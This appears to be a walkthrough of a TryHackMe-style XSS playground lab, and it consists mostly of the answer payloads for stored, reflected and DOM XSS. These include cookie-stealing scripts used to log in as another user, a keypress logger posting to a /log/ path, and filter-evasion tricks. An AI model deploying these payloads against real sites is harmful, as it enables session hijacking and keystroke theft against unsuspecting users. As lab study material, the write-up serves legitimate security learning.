# Stored XSS

1. Add html comment
   ```html
   <h1>HTML comment</h1>
   ;
   ```
2. Alert popup with cookie
   ```html
   <script>
     alert(document.cookie);
   </script>
   ```
3. Change XSS Playground to "I am a hacker"
   ```html
   <script>
     document.getElementById("thm-title").innerHTML = "I am a hacker";
   </script>
   ```
4. Steal Jack's cookie
   ```html
   <img src="javascript:'/log/' + document.cookie" />
   ```
5. Use a cookie manager plugin on firefox to login as Jack

# Reflected XSS

1. Create a popup that says hello
   ```html
   <script>
     alert("Hello");
   </script>
   ```
2. Create a popup with my IP address
   ```html
   <script>
     alert(window.location.hostname);
   </script>
   ```

# DOM XSS

1. Alert document cookie
   - test" "onmouseover=alert(document.cookie)
2. Create _onhover_ event that changes the background color to red
   - test" onmouseover="document.body.style.background='red'

# XSS Key Logger

```html
<script>
  document.onkeypress = function (e) {
    fetch("/log/" + e.key);
  };
</script>
```

# Filter Evasion

1. ```html
   <img src="test" onmouseover="alert('Hello')" />
   ```

2. ```html
   <!-- Using the eval function does not seem to work -->
   <img src="test" onmouseover="confirm('Hello')" />
   ```

3. ```html
   <!-- Embed another hello in there -->
   <img src="test" onmouseover="alert('HHelloello')" />
   ```

4. ```html
   <!-- Replace only replaces the first occurence unless a regex with global flag is used -->
   <img src="test" onmouseoveronmouseover="alert('HHelloello')" />
   ```
